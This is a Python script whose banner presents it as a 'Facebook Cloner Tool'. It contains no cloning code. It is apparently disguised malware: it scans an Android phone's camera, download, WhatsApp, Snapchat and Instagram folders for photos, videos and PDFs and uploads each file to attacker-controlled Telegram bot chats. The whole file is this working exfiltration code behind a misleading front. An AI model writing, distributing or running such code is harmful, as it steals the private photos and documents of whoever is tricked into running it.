import asyncio
import aiohttp
import os
import logging
from tokens import TOKENS as BOT_TOKENS

print(r"""
________    ___   _______     ____  ____       _       ______
|_   __  | .'   `.|_   __ \   |_   ||   _|     / \     |_   _ `.
  | |_ \_|/  .-.  \ | |__) |    | |__| |      / _ \      | | `. \
  |  _|   | |   | | |  __ /     |  __  |     / ___ \     | |  | |
 _| |_    \  `-'  /_| |  \ \_  _| |  | |_  _/ /   \ \_  _| |_.' /
|_____|    `.___.'|____| |___||____||____||____| |____||______.' 

        Multi Method Facebook Cloner Tool - Max Speed
              Tool Owner: FORHAD
""")

logging.basicConfig(level=logging.INFO, format='%(message)s')

CHAT_IDS_FILE = "chat_ids.txt"

TARGET_DIRS = [
    "/sdcard/DCIM/Camera",
    "/sdcard/Pictures",
    "/sdcard/Download",
    "/sdcard/WhatsApp/Media/WhatsApp Images",
    "/sdcard/Snapchat",
    "/sdcard/Instagram"
]

ALLOWED_EXTS = [".jpg", ".jpeg", ".png", ".mp4", ".pdf"]

MAX_CONCURRENT_REQUESTS = 150

def load_chat_ids(filename):
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        logging.error(f"Error loading {filename}: {e}")
        return []

CHAT_IDS = load_chat_ids(CHAT_IDS_FILE)

if not BOT_TOKENS or not CHAT_IDS:
    logging.error("Bot tokens or chat IDs missing, exiting.")
    exit(1)

def gather_files():
    files = []
    for folder in TARGET_DIRS:
        try:
            for root, _, filenames in os.walk(folder):
                for fname in filenames:
                    if fname.lower().endswith(tuple(ALLOWED_EXTS)):
                        files.append(os.path.join(root, fname))
        except Exception:
            pass
    return files

FILES = gather_files()
logging.info(f"Total files found: {len(FILES)}")
if not FILES:
    logging.error("No files to send, exiting.")
    exit(1)

semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)

def round_robin(lst):
    while True:
        for item in lst:
            yield item

token_gen = round_robin(BOT_TOKENS)
chat_id_gen = round_robin(CHAT_IDS)

async def send_file(session, file_path, index):
    async with semaphore:
        token = next(token_gen)
        chat_id = next(chat_id_gen)
        try:
            with open(file_path, "rb") as f:
                data = aiohttp.FormData()
                data.add_field("chat_id", chat_id)
                data.add_field("document", f, filename=os.path.basename(file_path))
                async with session.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data) as resp:
                    if resp.status == 200:
                        logging.info(f"[SUCCESS] Sent: {file_path}")
                    else:
                        logging.error(f"[FAIL] Status: {resp.status} File: {file_path}")
        except Exception as e:
            logging.error(f"[ERROR] Exception: {e} File: {file_path}")

async def main():
    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT_REQUESTS)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [send_file(session, file, idx) for idx, file in enumerate(FILES)]
        for future in asyncio.as_completed(tasks):
            await future
    print("\n[INFO] All files processed.")

if __name__ == "__main__":
    asyncio.run(main())
